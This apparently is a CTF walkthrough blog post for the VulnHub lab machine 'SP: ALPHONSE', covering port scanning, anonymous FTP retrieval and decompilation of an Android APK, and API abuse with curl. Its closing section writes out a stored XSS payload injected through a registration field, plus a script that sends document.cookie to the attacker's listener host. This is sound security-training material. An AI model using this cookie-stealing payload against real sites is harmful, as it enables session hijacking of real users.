layout: post
title:  "VulnHub - SP: ALPHONSE"
date:   2021-04-14 20:10:34 +0300
categories: [vulnhub,walkthrough]
pin: true
tags: [APK,APK analysis,XSS]

## Port Scan
```sh
┌──(alienum㉿kali)-[~]
└─$ sudo nmap -sS -A -O 10.0.2.228 -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 13:39 EEST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.0.2.228 (10.0.2.228)
Host is up (0.00073s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x    2 ftp      ftp          4096 Sep 05  2019 dev
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 30  2019 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp  open  http        Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:06:06:DA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: 127.0.1.1, ALPHONSE; OS: Unix

Host script results:
|_clock-skew: mean: 1h20m02s, deviation: 2h18m34s, median: 1s
|_nbstat: NetBIOS name: ALPHONSE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: alphonse
|   NetBIOS computer name: ALPHONSE\x00
|   Domain name: \x00
|   FQDN: alphonse
|_  System time: 2021-04-14T06:40:18-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-14T10:40:18
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 10.0.2.228 (10.0.2.228)
```

## ftp

- Download the `DNAnalyzer.apk`

```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ ftp 10.0.2.228
Connected to 10.0.2.228.
220 (vsFTPd 3.0.3)
Name (10.0.2.228:alienum): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd dev
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       2009772 Sep 02  2019 DNAnalyzer.apk
226 Directory send OK.
ftp> mget DNAnalyzer.apk
mget DNAnalyzer.apk? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for DNAnalyzer.apk (2009772 bytes).
226 Transfer complete.
2009772 bytes received in 0.02 secs (102.5285 MB/s)
ftp>
```

## Bytecode-Viewer

- Decompile the `DNAnalyzer.apk`
- Go to `com.dnanalyzer.jwt.network`
- Open the `NetworkRequest` class
- Found the `http://alphonse/dnanalyzer/` url
- And the android methods `doGetProtectedQuote` , `doLogin` and `doSignUp`

```java
private static final String BASE_URL = "http://alphonse/dnanalyzer/";
...
public void doGetProtectedQuote(@NonNull String var1, @Nullable com.dnanalyzer.jwt.network.NetworkRequest.Callback var2) {
      this.setCallback(var2);
      this.doGetRequestWithToken("http://alphonse/dnanalyzer/api/protected/result.php", new HashMap(), var1, var2);
   }

   public void doLogin(@NonNull String var1, @NonNull String var2, com.dnanalyzer.jwt.network.NetworkRequest.Callback var3) {
      this.setCallback(var3);
      HashMap var4 = new HashMap();
      var4.put("username", var1);
      var4.put("password", var2);
      this.doPostRequest("http://alphonse/dnanalyzer/api/login.php", var4, var3);
   }

   public void doSignUp(@NonNull String var1, @NonNull String var2, String var3, @Nullable com.dnanalyzer.jwt.network.NetworkRequest.Callback var4) {
      this.setCallback(var4);
      HashMap var5 = new HashMap();
      var5.put("username", var1);
      var5.put("password", var2);
      var5.put("dna_string", var3);
      this.doPostRequest("http://alphonse/dnanalyzer/api/register.php", var5, var4);
   }
```
![image](/assets/img/alphonse/1.PNG)

## Register User

- Using these data i will do a post request using `curl`

```java
public void doSignUp(@NonNull String var1, @NonNull String var2, String var3, @Nullable com.dnanalyzer.jwt.network.NetworkRequest.Callback var4) {
   this.setCallback(var4);
   HashMap var5 = new HashMap();
   var5.put("username", var1);
   var5.put("password", var2);
   var5.put("dna_string", var3);
   this.doPostRequest("http://alphonse/dnanalyzer/api/register.php", var5, var4);
}
```

- Curl request `register`

```sh
┌──(alienum㉿kali)-[~]
└─$ curl -X POST -d "username=alien&password=alien&dna_string=alien" http://alphonse/dnanalyzer/api/register.php
{"message":"User was successfully registered."}
```

- Curl request `login`

```sh
┌──(alienum㉿kali)-[~]
└─$ curl -X POST -d "username=alien&password=alien" http://alphonse/dnanalyzer/api/login.php   
{"message":"Successful login.","jwt":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJBbHBob25zZSIsImF1ZCI6IlRIRV9BVURJRU5DRSIsImlhdCI6MTYxODQwMjU3NywibmJmIjoxNjE4NDAyNTg3LCJleHAiOjE2MTg0MDI2MzcsImRhdGEiOnsiaWQiOiI0MiIsInVzZXJuYW1lIjoiYWxpZW4ifX0.VKRaOY6WHctkn5Rx57EEqkz4m2wXgzpTOMAqfjWGpRM","username":"alien","expireAt":1618402637}
```

## Identify XSS vulnerability

- Create a Script named `0.js`
```js
document.location = 'http://10.0.2.15/' + document.cookie;
```

- Listener
```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ cat 0.js
document.location = 'http://10.0.2.15/' + document.cookie;

┌──(alienum㉿kali)-[~]
└─$ sudo php -S 0.0.0.0:80        
[sudo] password for alienum:
[Wed Apr 14 18:07:00 2021] PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

- request

```sh
curl -X POST -d "username=alienum&password=alienum&dna_string=<img src='http://10.0.2.15/0.js'>" http://alphonse/dnanalyzer/api/register.php
{"message":"User was successfully registered."}
```

- XSS triggered
```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ sudo php -S 0.0.0.0:80
[sudo] password for alienum:
[Wed Apr 14 18:54:35 2021] PHP 7.4.15 Development Server (http://0.0.0.0:80) started
[Wed Apr 14 18:55:35 2021] 10.0.2.230:47406 Accepted
[Wed Apr 14 18:55:35 2021] 10.0.2.230:47406 [200]: (null) /0.js
[Wed Apr 14 18:55:35 2021] 10.0.2.230:47406 Closing
```

- As we see there is no cookie to retrieve, but we are able to `xss`

![image](/assets/img/alphonse/2.PNG)
